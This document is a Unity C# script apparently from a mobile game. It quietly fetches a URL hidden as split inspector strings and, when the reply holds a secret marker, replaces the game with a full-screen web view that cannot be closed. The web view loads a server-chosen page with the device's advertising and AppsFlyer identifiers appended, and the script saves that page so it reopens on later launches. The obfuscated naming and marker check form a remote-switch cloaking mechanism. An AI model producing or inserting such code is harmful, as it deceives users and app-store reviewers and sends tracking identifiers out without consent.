using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainTTB : MonoBehaviour
{
    public List<string> splitters;
    [HideInInspector] public string odTTBna = "";
    [HideInInspector] public string dvTTBna = "";

    private void GoTTB()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }




    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaTTB") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odTTBna = advertisingId; });
        }
    }



    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("refereeTTBhint", string.Empty) != string.Empty)
            {
                ETHMOIDTTBFORM(PlayerPrefs.GetString("refereeTTBhint"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvTTBna += n;
                }
                StartCoroutine(IENUMENATORTTB());
            }
        }
        else
        {
            GoTTB();
        }
    }



   

    

    private IEnumerator IENUMENATORTTB()
    {
        using (UnityWebRequest ttb = UnityWebRequest.Get(dvTTBna))
        {

            yield return ttb.SendWebRequest();
            if (ttb.isNetworkError)
            {
                GoTTB();
            }
            int wayTTB = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && wayTTB > 0)
            {
                yield return new WaitForSeconds(1);
                wayTTB--;
            }
            try
            {
                if (ttb.result == UnityWebRequest.Result.Success)
                {
                    if (ttb.downloadHandler.text.Contains("ThTmbBldrLxjme"))
                    {

                        try
                        {
                            var subs = ttb.downloadHandler.text.Split('|');
                            ETHMOIDTTBFORM(subs[0] + "?idfa=" + odTTBna, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            ETHMOIDTTBFORM(ttb.downloadHandler.text + "?idfa=" + odTTBna + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoTTB();
                    }
                }
                else
                {
                    GoTTB();
                }
            }
            catch
            {
                GoTTB();
            }
        }
    }

    private void ETHMOIDTTBFORM(string refereeTTBhint, string NamingTTB = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _associatesTTB = gameObject.AddComponent<UniWebView>();
        _associatesTTB.SetToolbarDoneButtonText("");
        switch (NamingTTB)
        {
            case "0":
                _associatesTTB.SetShowToolbar(true, false, false, true);
                break;
            default:
                _associatesTTB.SetShowToolbar(false);
                break;
        }
        _associatesTTB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _associatesTTB.OnShouldClose += (view) =>
        {
            return false;
        };
        _associatesTTB.SetSupportMultipleWindows(true);
        _associatesTTB.SetAllowBackForwardNavigationGestures(true);
        _associatesTTB.OnMultipleWindowOpened += (view, windowId) =>
        {
            _associatesTTB.SetShowToolbar(true);

        };
        _associatesTTB.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingTTB)
            {
                case "0":
                    _associatesTTB.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _associatesTTB.SetShowToolbar(false);
                    break;
            }
        };
        _associatesTTB.OnOrientationChanged += (view, orientation) =>
        {
            _associatesTTB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _associatesTTB.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("refereeTTBhint", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("refereeTTBhint", url);
            }
        };
        _associatesTTB.Load(refereeTTBhint);
        _associatesTTB.Show();
    }





}
